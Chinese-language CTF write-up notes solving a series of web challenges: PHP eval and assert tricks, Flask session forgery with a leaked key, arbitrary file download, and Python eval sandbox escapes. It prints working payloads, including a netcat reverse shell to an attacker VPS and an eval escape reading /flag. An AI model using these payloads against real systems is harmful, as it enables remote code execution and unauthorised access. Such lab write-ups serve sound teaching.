
#拼接字符串
# 我的眼里只有钱


```
<?php      
error_reporting(0); 
extract($_POST);
eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);  
highlight_file(__FILE__);?>
```

WP:
```python
t="_="  
for i in range(1,35):  
    t+="_"+str(i)+"="+"_"+str(i+1)+"&"  
  
t+="_35"+'='+"ls"  
print(t)
```
# 抽老婆
#session伪造 #任意文件下载
这里的下载存在任意下载漏洞，我们故意报错可知当前目录为/app
![](https://gitee.com/Yunxi555/wiki_-photo/raw/main/Pastedimage20250930173317.png)
我们下载app.py
得到密钥 `tanji_is_A_boy_Yooooooooooooooooooooo!`和一个秘密路径，这时候我们就用jwt解密在修改值在加密回去
```
# !/usr/bin/env python  
# -*-coding:utf-8 -*-  
  
"""  
# File       : app.py  
# Time       ：2022/11/07 09:16  
# Author     ：g4_simon  
# version    ：python 3.9.7  
# Description：抽老婆，哇偶~  
"""  
  
from flask import *  
import os  
import random  
from flag import flag  
  
#初始化全局变量  
app = Flask(__name__)  
app.config['SECRET_KEY'] = 'tanji_is_A_boy_Yooooooooooooooooooooo!'  
  
@app.route('/', methods=['GET'])  
def index():    
    return render_template('index.html')  
  
  
@app.route('/getwifi', methods=['GET'])  
def getwifi():  
    session['isadmin']=False  
    wifi=random.choice(os.listdir('static/img'))  
    session['current_wifi']=wifi  
    return render_template('getwifi.html',wifi=wifi)  
  
  
  
@app.route('/download', methods=['GET'])  
def source():   
    filename=request.args.get('file')  
    if 'flag' in filename:  
        return jsonify({"msg":"你想干什么？"})  
    else:  
        return send_file('static/img/'+filename,as_attachment=True)  
  
  
@app.route('/secret_path_U_never_know',methods=['GET'])  
def getflag():  
    if session['isadmin']:  
        return jsonify({"msg":flag})  
    else:  
        return jsonify({"msg":"你怎么知道这个路径的？不过还好我有身份验证"})  
  
  
  
if __name__ == '__main__':  
    app.run(host='0.0.0.0',port=80,debug=True)
```
这里需要我们flask-session伪造，使用flask-session-cookie-manager来写
```shell
 python flask_session_cookie_manager3.py encode -s "tanji_is_A_boy_Yooooooooooooooooooooo!" -t "{'current_wifi': '79315f6d857095bf8e8cbdb6ec045830.jpg', 'isadmin': True}"
```
![](https://gitee.com/Yunxi555/wiki_-photo/raw/main/Pastedimage20250930184311.png)
# 一言既出
#PHPweb/php特性/intval  
```
<?php  
highlight_file(__FILE__);   
include "flag.php";    
if (isset($_GET['num'])){  
    if ($_GET['num'] == 114514){        assert("intval($_GET[num])==1919810") or die("一言既出，驷马难追!");  
        echo $flag;  
    }   
}
```

`$num=114514+1805296`
`$num=114514//`
第一种解法intval会截断+后面的东西，只截取114514,
在 PHP 的早期版本中，`assert()` 函数的第一个参数如果是一个**字符串**，PHP 会将其内容作为 **PHP 代码** 执行一遍
第二种相当于截断，低版本PHP会尝试闭合语句
# 驷马难追
和一言既出一样，但是第二种方法被过滤

# TapTapTap
在js代码找到一个gameEngine.levelPassed();函数，使用它
多试几下获得一个路径/secret_path_you_do_not_know/secretfile.txt，访问他获得flag
# Webshell
又是反序列化
```
<?php

class Webshell{

    public $cmd="ls";

}

echo serialize(new Webshell());
命令替换一下即可
```
# 化零为整
大牛转换成url编码，一个一个传参
`?1=%E5&2=%A4&3=%A7&4=%E7&5=%89&6=%9B`
#  无一幸免_FIXED
这道题有点问题，怎么搞都会出现flag，其实这道题考察整数溢出问题
```
?0=214748364 //使用数组整型溢出绕过赋值式“永真” 
?0[]=1 //数组绕过

```

`9223372036854775807  2^63-1 `

# 传送之下（雾）
改一下js代码里的score就行，flag在控制台

# 算力超群
#沙箱逃逸
用findsomething工具找到一个路径`/_calculate`
![](https://gitee.com/Yunxi555/wiki_-photo/raw/main/Pastedimage20250930195813.png)
试着让除零，学过Java都知道除零会抛出`ZeroDivisionError`
![](https://gitee.com/Yunxi555/wiki_-photo/raw/main/Pastedimage20250930200011.png)
eval！！！，我们来构造payload,但是这里必须存在操作符，而且还会二次转换，我这里是VPS监听，`/_calculate?number1=1&operator=-&number2=1,__import__ ('os').system(' nc ip 端口 -e /bin/sh')`

# 算力升级
这里多了几个过滤，还变成了post,只能用某个库的函数gmpy2,但是这个库存在eval函数
`gmpy2.__builtins__['eval']("__import__('os').popen('tac /flag').read()")`
# EAZY_PYTHON
这个有源码
```
源码在此：

from flask import request  
cmd: str = request.form.get('cmd')  
param: str = request.form.get('param')  
# ------------------------------------- Don't modify ↑ them ↑! But you can write your code ↓  
import subprocess, os  
if cmd is not None and param is not None:  
    try:  
        tVar = subprocess.run([cmd[:3], param, __file__], cwd=os.getcwd(), timeout=5)  
        print('Done!')  
    except subprocess.TimeoutExpired:  
        print('Timeout!')  
    except:  
        print('Error!')  
else:  
    print('No Flag!')

如果环境出现故障，请访问 [这里](https://70de385f-a9a0-485c-8fa2-2a69eeecc72d.challenge.ctf.show/recover) 尝试恢复。

大菜鸡敬上！
```
cmd=ls&param=.

然后cat flag.txt